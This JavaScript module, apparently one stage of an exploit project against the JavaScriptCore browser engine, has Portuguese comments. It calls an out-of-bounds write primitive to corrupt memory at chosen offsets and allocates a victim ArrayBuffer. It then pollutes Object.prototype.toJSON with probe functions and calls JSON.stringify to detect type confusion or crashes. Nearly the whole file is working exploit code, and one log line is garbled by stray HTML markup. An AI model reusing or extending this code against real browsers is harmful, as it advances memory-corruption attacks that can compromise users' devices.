// js/script3/testVictimABInteractionAfterCorruption.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE = "VictimABInteractionTest_v25";

const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;
let probe_results_v25 = null;

// --- Variantes da toJSON para Sondar victim_ab ---

export function toJSON_V25_BaseProbe() {
    probe_results_v25 = { variant: "V25_BaseProbe", this_type: "N/A_before_call", error: null };
    try { probe_results_v25.this_type = Object.prototype.toString.call(this); }
    catch (e) { probe_results_v25.error = `${e.name}: ${e.message}`; }
    return probe_results_v25;
}

export function toJSON_V25_A_AccessByteLength() {
    probe_results_v25 = { variant: "V25_A_AccessByteLength", this_type: "N/A", byteLength: "N/A", error: null };
    try {
        probe_results_v25.this_type = Object.prototype.toString.call(this);
        if (this instanceof ArrayBuffer) {
            probe_results_v25.byteLength = this.byteLength;
        } else {  probe_results_v25.byteLength = "Not an ArrayBuffer"; }
    } catch (e) { probe_results_v25.error = `${e.name}: ${e.message}`; }
    return probe_results_v25;
}

export function toJSON_V25_B_AccessNonExistentProp() {
    probe_results_v25 = { variant: "V25_B_AccessNonExistentProp", this_type: "N/A", prop_value: "N/A", error: null };
    try {
        probe_results_v25.this_type = Object.prototype.toString.call(this);
        probe_results_v25.prop_value = this.non_existent_prop_abc123;
    } catch (e) { probe_results_v25.error = `${e.name}: ${e.message}`; }
    return probe_results_v25;
}

export function toJSON_V25_C_ObjectKeys() {
    probe_results_v25 = { variant: "V25_C_ObjectKeys", this_type: "N/A", keys: "N/A", error: null };
    try {
        probe_results_v25.this_type = Object.prototype.toString.call(this);
        probe_results_v25.keys = Object.keys(this);
    } catch (e) { probe_results_v25.error = `${e.name}: ${e.message}`; }
    return probe_results_v25;
}

export async function executeVictimABProbeTest(
    testDescription,
    toJSONFunctionToUse,
    corruptionOffset,
    valueForCorruption
) {
    const FNAME_CURRENT_TEST = `executeVictimABProbe<${testDescription}>`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST} ---`, "test", FNAME_CURRENT_TEST);
    document.title = `Probing victim_ab - ${testDescription}`;

    probe_results_v25 = null;
    let errorCapturedMain = null;
    let stringifyOutput = null;
    let didCrash = true;
    let lastStep = "init";
    const FAKE_VIEW_BASE_OFFSET_IN_OOB = 0x58; // Definido localmente ou importado se for global

    try {
        lastStep = "oob_setup";
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        const M_LENGTH_OFFSET_IN_VIEW_STRUCT_parsed = parseInt(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET, 16);
        if (!isNaN(M_LENGTH_OFFSET_IN_VIEW_STRUCT_parsed)) {
             const initialWriteOffset = FAKE_VIEW_BASE_OFFSET_IN_OOB + M_LENGTH_OFFSET_IN_VIEW_STRUCT_parsed;
             oob_write_absolute(initialWriteOffset, 0x100, 4); 
             logS3(`   (Contexto: m_length inicial de estrutura fake em ${toHex(FAKE_VIEW_BASE_OFFSET_IN_OOB)} setado para 0x100 em ${toHex(initialWriteOffset)})`, "info", FNAME_CURRENT_TEST);
        }

        lastStep = "critical_oob_write";
        logS3(`   CORRUPÇÃO: Escrevendo <span class="math-inline">\{toHex\(valueForCorruption\)\} em oob\_array\_buffer\_real\[</span>{toHex(corruptionOffset)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionOffset, valueForCorruption, 4);
        logS3(`     Escrita OOB em ${toHex(corruptionOffset)} realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(50);

        lastStep = "victim_creation";
        let victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
        logS3(`   victim_ab (${VICTIM_AB_SIZE} bytes) criado.`, "info", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let isPolluted = false;

        try {
            lastStep = "pp_pollution";
            Object.defineProperty(Object.prototype, ppKey, {
                value: toJSONFunctionToUse,
                writable: true, configurable: true, enumerable: false
            });
            isPolluted = true;
            logS3(`   Object.prototype.${ppKey} poluído com ${toJSONFunctionToUse.name}.`, "info", FNAME_CURRENT_TEST);

            lastStep = "before_stringify_victim";
            logS3(`   Chamando JSON.stringify(victim_ab)...`, "info", FNAME_CURRENT_TEST);
            stringifyOutput = JSON.stringify(victim_ab); 
            didCrash = false; 

            logS3(`   JSON.stringify(victim_ab) completou. Resultado da toJSON: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (stringifyOutput && stringifyOutput.error) {
                if(!errorCapturedMain) errorCapturedMain = new Error(stringifyOutput.error);
            }
        } catch (e_str) {
            errorCapturedMain = e_str;
            didCrash = false; 
            lastStep = "error_in_stringify";
            logS3(`   ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `ProbeVictim CRASH: ${e_str.name}`;
        } finally {
            if (isPolluted) {
                if (originalToJSONDesc) Object.defineProperty(Object.prototype, ppKey, originalToJSONDesc);
                else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer) {
        errorCapturedMain = e_outer;
        didCrash = false; 
        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer.name} - ${e_outer.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer.stack) logS3(`Stack: ${e_outer.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE} FALHOU: ${e_outer.name}`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} (Último passo: ${lastStep}) Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
    return { 
        test_description: testDescription,
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: didCrash, 
        toJSON_results: probe_results_v25 
    };
}
